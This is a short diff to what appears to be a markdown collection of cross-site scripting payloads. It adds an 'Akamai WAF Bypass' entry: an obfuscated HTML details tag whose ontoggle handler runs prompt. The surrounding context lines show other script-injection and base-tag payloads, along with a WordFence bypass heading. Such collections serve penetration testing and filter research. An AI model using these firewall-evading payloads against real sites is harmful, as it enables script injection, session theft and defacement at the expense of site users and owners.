@@ -771,6 +771,12 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 ?"></script><base%20c%3D=href%3Dhttps:\mysite>
 ```
 
+### Akamai WAF Bypass by [@s0md3v](https://twitter.com/s0md3v/status/1056447131362324480) - 28th october
+
+```html
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+```
+
 ### WordFence WAF Bypass by @brutelogic - 12th september
 
 ```javascript
